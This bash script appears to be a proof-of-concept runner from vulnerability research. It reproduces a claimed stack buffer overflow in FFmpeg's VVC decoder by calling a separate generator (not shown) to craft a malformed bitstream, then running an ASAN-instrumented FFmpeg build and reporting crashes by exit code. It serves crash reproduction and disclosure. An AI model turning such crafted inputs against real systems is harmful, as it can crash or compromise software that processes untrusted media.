#!/usr/bin/env bash
# PoC runner for VULN_001: Stack Buffer Overflow in matrix_mul() via DCT8/DST7
# Target: libavcodec/vvc/itx_1d.c:644-661

set -e

POC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FFMPEG="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
INPUT="$POC_DIR/vuln_001_input.vvc"

echo "=== VULN_001 PoC: Stack Buffer Overflow in matrix_mul() ==="
echo "=== Target: libavcodec/vvc/itx_1d.c lines 644-661       ==="
echo ""
echo "[*] Working directory: $POC_DIR"
echo "[*] FFmpeg binary: $FFMPEG"
echo "[*] Input file: $INPUT"
echo ""

# Step 1: Generate the crafted VVC file
echo "[*] Generating crafted VVC bitstream..."
python3 "$POC_DIR/vuln_001_gen.py" "$INPUT"
echo ""

if [ ! -f "$INPUT" ]; then
    echo "[!] ERROR: Input file was not created."
    exit 1
fi

echo "[*] Input file size: $(wc -c < "$INPUT") bytes"
echo ""

# Step 2: Run ASAN-instrumented FFmpeg
echo "[*] Running ASAN-instrumented FFmpeg..."
echo "[*] Command: $FFMPEG -f vvc -i $INPUT -f null -"
echo ""

# ASAN options: print stack trace on abort, no fork
export ASAN_OPTIONS="halt_on_error=1:print_stacktrace=1:verbosity=0"
export LSAN_OPTIONS="detect_leaks=0"

set +e
"$FFMPEG" -f vvc -i "$INPUT" -f null - 2>&1
EXIT_CODE=$?
set -e

echo ""
echo "[*] FFmpeg exit code: $EXIT_CODE"

if [ $EXIT_CODE -ne 0 ]; then
    echo "[!] FFmpeg exited with non-zero code: $EXIT_CODE"
    if [ $EXIT_CODE -eq 1 ]; then
        echo "[*] Exit code 1 typically indicates a decode error (expected for malformed input)"
    elif [ $EXIT_CODE -eq 134 ] || [ $EXIT_CODE -eq 6 ]; then
        echo "[!] CRASH DETECTED (SIGABRT/ASAN abort) - exit code $EXIT_CODE"
    elif [ $EXIT_CODE -eq 139 ]; then
        echo "[!] CRASH DETECTED (SIGSEGV) - exit code $EXIT_CODE"
    fi
fi

echo ""
echo "=== Run complete ==="
